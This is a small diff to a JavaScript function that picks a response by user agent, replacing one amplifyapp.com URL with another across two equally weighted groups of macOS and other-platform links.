@@ -46,14 +46,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://main.d2u3y9rzokuajs.amplifyapp.com/",
-            others: "https://main.d2u3y9rzokuajs.amplifyapp.com/"
+            macos: "https://main.d1wo02ycrg2zk.amplifyapp.com/",
+            others: "https://main.d1wo02ycrg2zk.amplifyapp.com/"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://main.d2u3y9rzokuajs.amplifyapp.com/",
-            others: "https://main.d2u3y9rzokuajs.amplifyapp.com/"
+            macos: "https://main.d1wo02ycrg2zk.amplifyapp.com/",
+            others: "https://main.d1wo02ycrg2zk.amplifyapp.com/"
         }
     ];
 
